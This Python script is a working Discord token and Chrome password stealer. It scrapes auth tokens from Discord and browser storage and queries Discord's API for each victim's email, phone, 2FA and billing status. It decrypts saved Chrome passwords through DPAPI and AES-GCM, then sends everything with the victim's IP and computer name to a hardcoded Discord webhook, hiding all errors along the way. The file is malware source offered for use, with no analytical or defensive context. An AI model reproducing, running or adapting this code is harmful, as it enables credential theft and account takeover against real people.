
import os
import re
from re import findall
from urllib.request import Request, urlopen
from json import loads, dumps
import os
import sqlite3
import shutil
import win32crypt
import base64
from Cryptodome.Cipher import AES
import json
import requests
import platform

########################################## Webhook Url ##########################################

WebHook_Url = "https://discord.com/api/webhooks/1009111513950330950/zlGjrhme7kj4xf3Yrl5C9A3v9QT7HPnVZsHrC8YQ4vIVJ3AdpJnc3j1U9COFLrt_BbwK"

########################################## Def Converter  ##########################################

def converter(time):
    m, s = divmod(time, 60)
    h, m = divmod(m, 60)
    d, h = divmod(h, 24)
    if time < 60:
        return (f"00:%02d"%(s)) 
    elif time >= 60:
        return (f"%02d:%02d"%(m, s)) 
    elif time >= 3600:
        return (f"%d:%02d:%02d"%(h, m, s)) 

########################################## Get Headers ##########################################

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

########################################## Get User Data ##########################################

def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass

########################################## Get Tokens ##########################################

def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

########################################## Get Avatar ##########################################

def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url

########################################## Get ip ##########################################

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

########################################## Get ip ##########################################

def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

########################################## Get Start ##########################################

def start():
    checked = []
    embeds = []
    already_cached_tokens = []

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    cache_path = roaming + "\\.cache~$"
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)

            user_data = getuserdata(token)
            if not user_data:
                continue

            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_data["id"], user_data["avatar"])
            

            ############### Chech if user have phone or no ###############
            
            has_number = ""
            if user_data.get("phone") == None:
                has_number = '❌' 
            else:
                has_number = user_data.get("phone")

            ############### Chech if user have nitro or no ###############
            has_nitro = ""
            if user_data.get("premium_type") == None:
                has_nitro = '❌'
            else:
                has_nitro = user_data.get("premium_type")

            ############### Chech if user have nitro or no ###############
            twofa = ""
            if user_data.get('mfa_enabled') == True:
                twofa = "✅"
            else:
                twofa = "❌"

            ############### Chech if user have billing or no ###############
            billing = ""
            if bool(has_payment_methods(token)) == True:
                billing = "✅"
            else:
                billing = "❌"

                

            account_details = f"""
            **Username:** {user_data["username"]}#{str(user_data["discriminator"])}
            **Userid:** {user_data["id"]}
            **Email:** {user_data.get("email")}
            **Phone:** {has_number}
            **Nitro:** {has_nitro}
            **2FA:** {twofa}
            **Billing:** {billing}"""
            

            pc_details = f"""
            **Computer Name:** {pc_username}
            **IP Address:** {ip}
            **Token Location:** {platform}"""
            
            embed = {
                "fields": [
                    {
                        "name": "**Account details**",
                        "value": account_details,
                        "inline": True
                    },
                    {
                        "name": "**PC details**",
                        "value": pc_details,
                        "inline": True
                    },
                    {
                        "name": "**Account Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "thumbnail":{
                    "url": f"{avatar_url}"
                }
            }
            embeds.append(embed)

    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    webhook = {
        "content": "",
        "embeds": embeds,
    }
    try:
        urlopen(Request(WebHook_Url, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass




########################################## Chrome ##########################################



CHROME_PATH_LOCAL_STATE = r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])
CHROME_PATH = r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE'])

def getAppData():
    if platform.system() == 'Linux': 
        return os.getenv('HOME')+'/.config'
    elif platform.system() == 'Windows':
        return os.getenv('APPDATA') 
    else:
        return os.getenv('XDG_CONFIG_HOME')

def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""

def get_info():
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        secret_key = get_secret_key()
        for result in cursor.fetchall():
            login = result[0]
            email = result[1]
            password = result[2]
            if(login!="" and email!="" and password!=""):
                account_password = decrypt_password(result[2], secret_key)
                message = f"""**Email: ** {email}
                **Password: ** {account_password}
                **Login portal: ** {login}"""
                embed = {
                    "fields": [
                        {
                            "name": "**Account details**",
                            "value": message,
                            "inline": True
                        }
                    ]
                }
                data = {
                    "content": "",
                    "embeds": [embed],
                }
                try:
                   result = requests.post(WebHook_Url, json=data)
                except:
                    pass
            
########################################## Start ##########################################


try:
    start()
except:
    pass

try:
    get_info()
except:
    pass